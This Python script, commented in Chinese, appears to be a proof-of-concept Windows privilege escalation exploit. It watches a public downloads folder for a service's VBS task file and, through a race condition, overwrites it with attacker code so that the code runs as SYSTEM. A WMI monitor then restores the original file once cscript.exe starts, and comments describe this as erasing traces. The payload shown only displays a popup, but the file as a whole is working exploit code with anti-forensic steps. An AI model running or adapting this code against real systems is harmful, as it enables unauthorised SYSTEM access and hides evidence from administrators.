import os
import sys
import time
import threading
import win32file
import win32con
import win32com.client
import pythoncom  # <--- 1. 必须导入这个底层核心库

# =====================================================================
# 配置区域
# =====================================================================
MONITOR_DIR = "C:\\Users\\Public\\Downloads\\python"
TARGET_FILE = "bhservice_task.vbs"
FILE_LIST_DIRECTORY = 0x0001

ORIGINAL_VBS_CODE = '''Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.LogEvent 4, "Normal system maintenance complete."
'''

EVIL_VBS_CODE = '''Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Popup "【提权警告】: 恶意代码已在 SYSTEM 权限下执行！", 5, "SYSTEM 权限"
'''

def restore_original_file(file_path):
    """【功成身退】：将文件瞬间还原为合法内容"""
    try:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(ORIGINAL_VBS_CODE)
        print(f"[↩️ 无痕恢复] 成功！文件 {TARGET_FILE} 已恢复为管理员原版代码，痕迹抹除干净。")
    except Exception:
        pass

def start_wmi_process_monitor(full_file_path):
    """
    线程 B：WMI 进程监视器
    """
    # =====================================================================
    # 修复核心：必须在子线程第一行显式初始化 Windows COM 组件
    # =====================================================================
    pythoncom.CoInitialize() 
    
    try:
        obj_wmi_service = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        obj_swbem_services = obj_wmi_service.ConnectServer(".", "root\\cimv2")
        query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'"
        i_wbem_event_source = obj_swbem_services.ExecNotificationQuery(query)

        while True:
            next_event = i_wbem_event_source.NextEvent()
            proc_name = next_event.TargetInstance.Name
            print(f"proc name is {proc_name.lower()}")
            # 只要一看到高权限服务把 cscript.exe 拉起来了
            if proc_name.lower() == "cscript.exe":
                print(f"[!] 监视器感知：高权限 cscript.exe 已成功拉起！内核已读取恶意 payload。")
                restore_original_file(full_file_path)
                
    except Exception as e:
        print(f"[-] 子线程内发生异常: {e}")
    finally:
        # 严格遵守规范，线程退出时释放 COM 资源
        pythoncom.CoUninitialize()

def start_file_monitor():
    """
    线程 A：文件监视器
    """
    full_path = os.path.join(MONITOR_DIR, TARGET_FILE)
    
    # 启动异步线程 B 盯着进程
    wmi_thread = threading.Thread(target=start_wmi_process_monitor, args=(full_path,), daemon=True)
    wmi_thread.start()

    print(f"[*] 工业级无痕条件竞争引擎已启动...")
    print(f"[*] 平时硬盘保留合法代码。当服务触碰时篡改，执行后瞬间恢复。")
    print("-" * 75)

    h_dir = win32file.CreateFile(
        MONITOR_DIR, FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None, win32con.OPEN_EXISTING, win32con.FILE_FLAG_BACKUP_SEMANTICS, None
    )

    while True:
        results = win32file.ReadDirectoryChangesW(
            h_dir, 1024, False,
            win32con.FILE_NOTIFY_CHANGE_FILE_NAME | win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
            None, None
        )

        for action, file_name in results:
            if file_name.lower() == TARGET_FILE.lower():
                # 当发现服务开始创建或写入该文件时
                if action == 1 or action == 3:
                    try:
                        with open(full_path, "w", encoding="utf-8") as f:
                            f.write(EVIL_VBS_CODE)
                        print(f"\n[⚡ 绝杀成功] 捕获到服务触碰！已瞬间写入恶意代码，等待内核读取...")
                    except Exception:
                        pass

if __name__ == "__main__":
    # 实验前，先在本地生成一个干净的原版合法文件
    with open(os.path.join(MONITOR_DIR, TARGET_FILE), "w", encoding="utf-8") as init_f:
        init_f.write(ORIGINAL_VBS_CODE)
        
    start_file_monitor()
